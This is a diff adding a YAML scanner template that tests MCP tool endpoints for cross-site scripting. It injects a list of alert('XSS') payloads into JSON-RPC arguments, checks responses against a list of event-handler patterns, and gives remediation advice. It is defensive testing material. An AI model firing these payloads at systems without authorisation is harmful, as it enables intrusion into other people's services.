@@ -1,0 +1,173 @@
+---
+id: MCP_XSS_INJECTION_PARAMETER_INJECTION
+
+info:
+  name: "MCP: XSS Injection Parameter Injection"
+  description: >
+    Tests whether MCP tool endpoints are vulnerable to Cross-Site Scripting (XSS) attacks
+    through parameter manipulation. This test attempts to inject malicious JavaScript
+    code into function parameters to execute scripts in the context of other users
+    or the application itself.
+  details: >
+    Test idea:
+    - Inject XSS payloads into various parameter fields of MCP tool calls
+    - Test common XSS injection techniques including script tags, event handlers,
+      and JavaScript execution contexts
+    - Attempt to execute malicious scripts, steal session tokens, and perform
+      client-side attacks
+    - Test for XSS injection in different parameter contexts (user input, content
+      generation, response formatting, etc.)
+    - This template targets MCP endpoints that process and return user input and flags
+      successful XSS injection attempts through response analysis.
+  impact: >
+    Successful XSS injection through MCP parameters can lead to:
+    - Session hijacking and authentication bypass
+    - Sensitive data theft and user privacy violations
+    - Malicious script execution in user browsers
+    - Phishing attacks and social engineering
+    - Client-side security compromise
+  remediation: |
+    To prevent XSS injection through MCP parameters:
+    
+    1. **Input Validation**: Implement strict input validation for all parameters. Validate parameter types, formats, and ranges before processing.
+    
+    2. **Input Sanitization**: Sanitize all parameter values to remove or escape HTML tags, JavaScript code, and XSS patterns.
+    
+    3. **Output Encoding**: Properly encode all user input before including it in responses to prevent script execution.
+    
+    4. **Content Security Policy**: Implement Content Security Policy (CSP) headers to prevent unauthorized script execution.
+    
+    5. **Input Filtering**: Implement input filters that detect and block XSS patterns and malicious content.
+    
+    6. **Error Handling**: Implement secure error handling that doesn't reveal internal system details or execute user input.
+    
+    7. **Logging and Monitoring**: Log all XSS injection attempts and monitor for suspicious patterns.
+    
+    8. **Regular Security Testing**: Conduct regular security testing to identify and fix XSS vulnerabilities.
+  category:
+    name: MCP_SECURITY
+    shortName: MCP_SEC
+    displayName: Model Context Protocol (MCP) Security
+  subCategory: MCP_XSS_INJECTION_PARAMETER_INJECTION
+  severity: HIGH
+  tags:
+    - mcp
+    - xss-injection
+    - parameter-injection
+    - client-security
+    - llm-security
+  references:
+    - https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
+    - https://cwe.mitre.org/data/definitions/79.html
+    - https://owasp.org/www-project-llm-security-top-10/
+  cwe:
+    - CWE-79
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2023-41031
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+wordLists:
+  xssInjectionPayloads:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "<iframe src=javascript:alert('XSS')>"
+    - "<body onload=alert('XSS')>"
+    - "<input onfocus=alert('XSS') autofocus>"
+    - "<select onfocus=alert('XSS') autofocus>"
+    - "<textarea onfocus=alert('XSS') autofocus>"
+    - "<keygen onfocus=alert('XSS') autofocus>"
+    - "<video><source onerror=alert('XSS')>"
+    - "<audio src=x onerror=alert('XSS')>"
+    - "<details open ontoggle=alert('XSS')>"
+    - "<marquee onstart=alert('XSS')>"
+    - "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+    for_one:
+      key:
+        regex: .*
+        extractMultiple: payloadKeys
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            params.arguments.${payloadKeys}: "${xssInjectionPayloads}"
+        - add_body_param:
+            params.arguments.content: "${xssInjectionPayloads}"
+        - add_body_param:
+            params.arguments.text: "${xssInjectionPayloads}"
+        - add_body_param:
+            params.arguments.message: "${xssInjectionPayloads}"
+        - add_body_param:
+            params.arguments.data: "${xssInjectionPayloads}"
+validate:
+  response_payload:
+    contains_either:
+      - "<script>"
+      - "javascript:"
+      - "onerror="
+      - "onload="
+      - "onfocus="
+      - "onclick="
+      - "onmouseover="
+      - "onmouseout="
+      - "onkeydown="
+      - "onkeyup="
+      - "onkeypress="
+      - "onchange="
+      - "onsubmit="
+      - "onreset="
+      - "onblur="
+      - "onfocus="
+      - "onload="
+      - "onunload="
+      - "onresize="
+      - "onscroll="
+      - "onbeforeunload="
+      - "onhashchange="
+      - "onpagehide="
+      - "onpageshow="
+      - "onpopstate="
+      - "onstorage="
+      - "ononline="
+      - "onoffline="
+      - "onmessage="
+      - "onerror="
+      - "onabort="
+      - "oncanplay="
+      - "oncanplaythrough="
+      - "ondurationchange="
+      - "onemptied="
+      - "onended="
+      - "onerror="
+      - "onloadeddata="
+      - "onloadedmetadata="
+      - "onloadstart="
+      - "onpause="
+      - "onplay="
+      - "onplaying="
+      - "onprogress="
+      - "onratechange="
+      - "onseeked="
+      - "onseeking="
+      - "onstalled="
+      - "onsuspend="
+      - "ontimeupdate="
+      - "onvolumechange="
+      - "onwaiting="
